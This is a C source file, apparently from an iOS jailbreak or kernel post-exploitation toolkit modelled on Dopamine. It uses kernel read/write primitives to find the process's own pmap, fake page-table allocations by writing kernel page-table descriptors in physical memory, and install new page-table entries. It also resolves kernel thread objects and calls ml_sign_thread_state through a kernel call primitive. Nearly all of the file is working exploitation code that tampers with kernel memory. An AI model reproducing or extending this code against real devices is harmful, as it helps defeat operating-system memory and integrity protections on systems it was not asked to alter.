// Minimal util.c excerpt for phys-rw_pte (pmap_expand_range) — no IOKit/libarchive.
#include "util.h"
#include "primitives.h"
#include "info.h"
#include "kernel.h"
#include "translation.h"
#include "pte.h"
#include "dt_physrw_log.h"
#include "dt_pte_kwrite.h"
#include "dt_pmap_probe.h"
#include <errno.h>
#include <dispatch/dispatch.h>
#include <stdlib.h>
#include <string.h>
#include <string.h>
#include <stdio.h>
#include <stdarg.h>
#include <mach/mach.h>

static dt_physrw_log_fn g_physrw_log_fn = NULL;
static dt_physrw_stage_fn g_physrw_stage_fn = NULL;

#define DT_ALLOC_PT_MAX_RETRIES 256
#define DT_EXPAND_MAX_LAPS 32

void dt_physrw_set_log_fn(dt_physrw_log_fn fn)
{
    g_physrw_log_fn = fn;
}

void dt_physrw_set_stage_fn(dt_physrw_stage_fn fn)
{
    g_physrw_stage_fn = fn;
}

static void physrw_log(const char *fmt, ...)
{
    if (!g_physrw_log_fn || !fmt) return;
    char buf[512];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    g_physrw_log_fn(buf);
}

static void physrw_stage(const char *fmt, ...)
{
    char buf[320];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    dt_physrw_log_stage(buf);
}

void dt_physrw_log_stage(const char *msg)
{
    if (!msg || !msg[0]) return;
    if (g_physrw_stage_fn)
        g_physrw_stage_fn(msg);
    physrw_log("[phys] %s", msg);
}

static bool pt_ref_is_usable(uint16_t ref0)
{
    // Dopamine expects ref==1 after anonymous fault-in; kernel pmap uses 0x4000 as free sentinel.
    return ref0 == 1 || ref0 == 0x4000;
}

static uint64_t dt_pmap_self(void);

void dt_physrw_log_pmap_debug(void)
{
    uint64_t pmap = dt_pmap_self();
    if (!pmap) {
        physrw_log("[phys] pmap debug: pmap_self()=0");
        return;
    }

    uint64_t tte_root = kread64(pmap + koffsetof(pmap, tte));
    uint64_t ttep = kread64(pmap + koffsetof(pmap, ttep));
    uint32_t sw_off = (uint32_t)koffsetof(pmap, sw_asid);
    uint64_t sw_asid_addr = pmap + sw_off;
    uint64_t sw_page = sw_asid_addr & ~vm_real_kernel_page_mask;
    uint64_t sw_page_pa = kvtophys(sw_page);
    uint64_t sw_pageoff = sw_asid_addr & vm_real_kernel_page_mask;
    uint16_t asid_at_8c = kread16(pmap + 0x8C);
    uint16_t asid_at_8e = kread16(pmap + 0x8E);

    uint64_t computed_kv = phystokv(ttep);
    physrw_log("[phys] pmap=%llx tte+0=0x%llx ttep+8=0x%llx computed_kv=0x%llx sw_asid_off=0x%x asid@8c=0x%x asid@8e=0x%x sw_page_pa=0x%llx sw_pageoff=0x%llx",
        pmap, tte_root, ttep, computed_kv, sw_off, asid_at_8c, asid_at_8e, sw_page_pa, sw_pageoff);
    physrw_stage("pmap tte+0=0x%llx ttep=0x%llx computed_kv=0x%llx asid8c=0x%x",
        tte_root, ttep, computed_kv, asid_at_8c);
    if (tte_root != computed_kv) {
        physrw_stage("pmap root_kv mismatch tte+0=0x%llx phystokv(ttep)=0x%llx", tte_root, computed_kv);
    }
}

void proc_iterate(void (^itBlock)(uint64_t, bool *))
{
    uint64_t proc = ksymbol(allproc);
    while ((proc = kread_ptr(proc + koffsetof(proc, list_next)))) {
        bool stop = false;
        itBlock(proc, &stop);
        if (stop) return;
    }
}

static uint64_t gSelfProc = 0;
static uint64_t gSelfTask = 0;
static uint64_t gSelfMap = 0;
static uint64_t gSelfPmap = 0;
static bool s_proc_cached = false;
static bool s_task_cached = false;
static bool s_map_cached = false;
static bool s_pmap_cached = false;

uint64_t proc_self(void)
{
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        gSelfProc = proc_find(getpid());
        proc_rele(gSelfProc);
        s_proc_cached = true;
    });
    return gSelfProc;
}

uint64_t task_self(void)
{
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        gSelfTask = proc_task(proc_self());
        s_task_cached = true;
    });
    return gSelfTask;
}

uint64_t vm_map_self(void)
{
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        gSelfMap = kread_ptr(task_self() + koffsetof(task, map));
        s_map_cached = true;
    });
    return gSelfMap;
}

static uint64_t dt_pmap_self(void);

uint64_t pmap_self(void)
{
    return dt_pmap_self();
}

static uint64_t dt_pmap_self(void)
{
    static dispatch_once_t once;
    dispatch_once(&once, ^{
        gSelfPmap = kread_ptr(vm_map_self() + koffsetof(vm_map, pmap));
        s_pmap_cached = true;
    });
    return gSelfPmap;
}

void dt_pmap_cache_snapshot(dt_pmap_cache_snapshot_t *out)
{
    if (!out) return;
    memset(out, 0, sizeof(*out));
    out->proc_cached = s_proc_cached;
    out->task_cached = s_task_cached;
    out->map_cached = s_map_cached;
    out->pmap_cached = s_pmap_cached;
    out->proc = gSelfProc;
    out->task = gSelfTask;
    out->map = gSelfMap;
    out->pmap = gSelfPmap;
}

uint64_t alloc_page_table_unassigned(void)
{
    uint64_t pmap = dt_pmap_self();
    uint64_t ttep = kread64(pmap + koffsetof(pmap, ttep));

    void *free_lvl2 = NULL;
    uint64_t tte_lvl2 = 0;
    uint64_t allocatedPT = 0;
    uint64_t pinfo_pa = 0;
    uint32_t retry = 0;

    while (true) {
        retry++;
        if (posix_memalign(&free_lvl2, L2_BLOCK_SIZE, L2_BLOCK_SIZE) != 0) {
            physrw_log("[phys] alloc_pt: posix_memalign failed after %u retries", retry - 1);
            return 0;
        }
        *(volatile uint64_t *)free_lvl2;

        uint64_t lvl = PMAP_TT_L2_LEVEL;
        allocatedPT = vtophys_lvl(ttep, (uint64_t)free_lvl2, &lvl, &tte_lvl2);

        uint64_t pvh = pai_to_pvh(pa_index(allocatedPT));
        uint64_t ptdp = pvh_ptd(pvh);
        uint64_t refptr = kread64(ptdp + koffsetof(pt_desc, ptd_info));
        pinfo_pa = kvtophys(refptr);

        uint16_t ref0 = physread16(pinfo_pa);
        uint16_t ref1 = physread16(pinfo_pa + sizeof(uint16_t));

        (void)ptdp;
        (void)refptr;
        (void)pinfo_pa;
        (void)ref1;

        if (!pt_ref_is_usable(ref0)) {
            if (retry == 1 || retry == 2 || (retry % 16) == 0 || retry >= DT_ALLOC_PT_MAX_RETRIES) {
                physrw_stage("alloc_pt retry=%u ref0=0x%x ref1=0x%x pa=0x%llx",
                    retry, ref0, ref1, allocatedPT);
            }
            if (retry >= DT_ALLOC_PT_MAX_RETRIES) {
                physrw_stage("alloc_pt giveup ref0=0x%x ref1=0x%x pa=0x%llx retries=%u",
                    ref0, ref1, allocatedPT, retry);
                free(free_lvl2);
                return 0;
            }
            free(free_lvl2);
            continue;
        }

        break;
    }

    physwrite16(pinfo_pa, 0x1337);
    free(free_lvl2);
    physwrite64(tte_lvl2, 0);
    physwrite16(pinfo_pa, 0);

    return allocatedPT;
}

uint64_t pmap_alloc_page_table(uint64_t pmap, uint64_t va)
{
    if (!pmap) {
        pmap = pmap_self();
    }

    uint64_t tt_p = alloc_page_table_unassigned();
    if (!tt_p) return 0;

    uint64_t pvh = pai_to_pvh(pa_index(tt_p));
    uint64_t ptdp = pvh_ptd(pvh);
    uint64_t ptdp_pa = kvtophys(ptdp);

    physwrite64(ptdp_pa + koffsetof(pt_desc, pmap), pmap);

    for (uint64_t po = 0; po < vm_page_size; po += vm_real_kernel_page_size) {
        physwrite64(ptdp_pa + koffsetof(pt_desc, va) + (po / vm_page_size), va + po);
    }

    return tt_p;
}

static int dt_expand_check_root_kv(uint64_t pmap)
{
    uint64_t tte_root = kread64(pmap + koffsetof(pmap, tte));
    uint64_t ttep = kread64(pmap + koffsetof(pmap, ttep));
    uint64_t computed_kv = phystokv(ttep);

    physrw_stage("expand root_kv=0x%llx ttep=0x%llx phystokv=0x%llx",
        tte_root, ttep, computed_kv);
    if (tte_root != computed_kv) {
        physrw_stage("expand root_kv mismatch tte+0=0x%llx phystokv(ttep)=0x%llx",
            tte_root, computed_kv);
        return -7;
    }
    return 0;
}

int pmap_expand_range(uint64_t pmap, uint64_t vaStart, uint64_t size)
{
    physrw_stage("expand enter va=0x%llx size=0x%llx pmap=0x%llx", vaStart, size, pmap);
    physrw_stage("PTE_EXPAND_PHYSICAL_TTEP_REPAIR=E1");

    int root_chk = dt_expand_check_root_kv(pmap);
    if (root_chk != 0)
        return root_chk;

    // Match Dopamine's non-kcall path: walk from the physical root.  The PTE
    // handoff intentionally clears raw kread/kwrite, so a virtual-root walk
    // can return before updating leafLevel and look like a false L3 success.
    uint64_t ttep = kread64(pmap + koffsetof(pmap, ttep));
    if (!ttep) {
        physrw_stage("expand physical ttep=0 pmap=0x%llx", pmap);
        return -5;
    }

    uint64_t l2Start = (vaStart & ~L2_BLOCK_MASK);
    uint64_t l2End = (((vaStart + size) + (L2_BLOCK_SIZE - 1)) & ~L2_BLOCK_MASK);
    for (uint64_t va = l2Start; va < l2End; va += L2_BLOCK_SIZE) {
        uint32_t lap = 0;
        uint64_t leafLevel;
        do {
            lap++;
            leafLevel = PMAP_TT_L3_LEVEL;
            uint64_t pte_pa = 0;
            uint64_t translated = vtophys_lvl(ttep, va, &leafLevel, &pte_pa);
            int translation_errno = errno;

            if (lap <= 3 || lap == DT_EXPAND_MAX_LAPS) {
                physrw_log("[phys] expand lap=%u va=0x%llx leaf=%llu pte_pa=0x%llx translated=0x%llx errno=%d",
                    lap, va, (unsigned long long)leafLevel, pte_pa, translated,
                    translation_errno);
            }

            // errno 1042 means the current entry is invalid.  That is the
            // expected signal to allocate the next table when the physical
            // slot and leaf level are valid.  errno 1043 means traversal had
            // no usable primitive and must never be accepted as L3 success.
            if (!pte_pa || translation_errno == 1043) {
                physrw_stage("expand physical traversal fail lap=%u va=0x%llx leaf=%llu pte_pa=0x%llx errno=%d",
                    lap, va, (unsigned long long)leafLevel, pte_pa,
                    translation_errno);
                return -5;
            }
            if (translated && leafLevel < PMAP_TT_L3_LEVEL) {
                physrw_stage("expand unexpected block mapping lap=%u va=0x%llx leaf=%llu pa=0x%llx",
                    lap, va, (unsigned long long)leafLevel, translated);
                return -4;
            }

            if (leafLevel != PMAP_TT_L3_LEVEL) {
                uint64_t pt_va = 0;
                switch (leafLevel) {
                    case PMAP_TT_L1_LEVEL:
                        pt_va = va & ~L1_BLOCK_MASK;
                        break;
                    case PMAP_TT_L2_LEVEL:
                        pt_va = va & ~L2_BLOCK_MASK;
                        break;
                    default:
                        physrw_stage("expand bad leaf=%llu va=0x%llx lap=%u",
                            (unsigned long long)leafLevel, va, lap);
                        return -4;
                }
                uint64_t need_level = leafLevel + 1;
                uint64_t old_pte = physread64(pte_pa);
                uint64_t newTable = pmap_alloc_page_table(pmap, pt_va);
                if (!newTable) {
                    physrw_log("[phys] pmap_expand_range: pmap_alloc_page_table failed va=0x%llx", pt_va);
                    physrw_stage("expand alloc_pt failed va=0x%llx", pt_va);
                    return -2;
                }
                uint64_t new_pte = (newTable & 0xDFFFFFFFFFFFFFFCLL) | ARM_TTE_VALID | ARM_TTE_TYPE_TABLE;
                new_pte &= 0x80FFFFFFFFFFFFFFLL;
                if (old_pte == 0) {
                    physrw_stage("expand zero-slot pte install slot_pa=0x%llx tbl=0x%llx",
                        pte_pa, newTable);
                }
                int wr = physwrite64(pte_pa, new_pte);
                uint64_t rb_pte = physread64(pte_pa);

                physrw_stage("expand lap=%u need=L%llu slot_pa=0x%llx tbl=0x%llx wr=%d old=0x%llx want=0x%llx rb=0x%llx",
                    lap, (unsigned long long)need_level, pte_pa, newTable, wr,
                    old_pte, new_pte, rb_pte);

                if (wr != 0 || rb_pte != new_pte) {
                    physrw_stage("expand pte commit fail lap=%u wr=%d rb=0x%llx want=0x%llx",
                        lap, wr, rb_pte, new_pte);
                    return -5;
                }
                leafLevel++;
            }

            if (lap >= DT_EXPAND_MAX_LAPS) {
                physrw_stage("expand giveup laps=%u va=0x%llx leaf=%llu pte_pa=0x%llx",
                    lap, va, (unsigned long long)leafLevel, pte_pa);
                return -3;
            }
        } while (leafLevel < PMAP_TT_L3_LEVEL);
    }
    physrw_stage("expand OK va=0x%llx", vaStart);
    return 0;
}

uint64_t ttep_self(void)
{
    uint64_t pmap = dt_pmap_self();
    if (!pmap)
        return 0;
    return kread64(pmap + koffsetof(pmap, ttep));
}

uint64_t task_get_ipc_port_table_entry(uint64_t task, mach_port_t port)
{
    uint64_t itk_space = kread_ptr(task + koffsetof(task, itk_space));
    return ipc_entry_lookup(itk_space, port);
}

uint64_t task_get_ipc_port_object(uint64_t task, mach_port_t port)
{
    return kread_ptr(task_get_ipc_port_table_entry(task, port) + koffsetof(ipc_entry, object));
}

uint64_t task_get_ipc_port_kobject(uint64_t task, mach_port_t port)
{
    return kread_ptr(task_get_ipc_port_object(task, port) + koffsetof(ipc_port, kobject));
}

#include "physrw.h"
#include "physrw_pte.h"

int physrw_handoff(pid_t pid)
{
    uint64_t asid = 0;
    return physrw_pte_handoff(pid, &asid);
}

void thread_caffeinate_start(void)
{
}

void thread_caffeinate_stop(void)
{
}

int sign_kernel_thread(uint64_t proc, mach_port_t threadPort)
{
    uint64_t threadKobj = task_get_ipc_port_kobject(proc_task(proc), threadPort);
    uint64_t threadContext = kread_ptr(threadKobj + koffsetof(thread, machine_contextData));

    uint64_t pc   = kread64(threadContext + offsetof(kRegisterState, pc));
    uint64_t cpsr = kread64(threadContext + offsetof(kRegisterState, cpsr));
    uint64_t lr   = kread64(threadContext + offsetof(kRegisterState, lr));
    uint64_t x16  = kread64(threadContext + offsetof(kRegisterState, x[16]));
    uint64_t x17  = kread64(threadContext + offsetof(kRegisterState, x[17]));

    return kcall(NULL, ksymbol(ml_sign_thread_state), 6,
        (uint64_t[]){ threadContext, pc, cpsr, lr, x16, x17 });
}
